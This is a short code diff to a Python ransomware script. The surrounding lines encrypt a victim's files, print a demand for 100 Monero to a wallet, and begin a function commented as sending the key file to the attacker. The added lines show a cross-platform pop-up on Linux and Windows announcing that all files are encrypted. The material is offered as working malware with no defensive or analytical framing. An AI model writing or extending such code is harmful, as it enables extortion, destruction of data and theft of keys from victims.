@@ -3,6 +3,7 @@ import subprocess # Import the subprocess module
 import sys # Import the sys module
 import os # Import the os module
 import logging
+import ctypes
 # Configuración del logging
 logging.basicConfig(filename='log.txt', level=logging.ERROR,
                     format='%(asctime)s - %(levelname)s - %(message)s')
@@ -68,6 +69,10 @@ for file in files:
     except Exception as e:
         print(f"Error encrypting file {file}: {e}")
 
+if sys.platform == "linux":
+    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
+else:
+    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted", "Notification", 1)
 print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
 
 def send_file_to_host(file_path, host, port): # Send the key file to the attacker
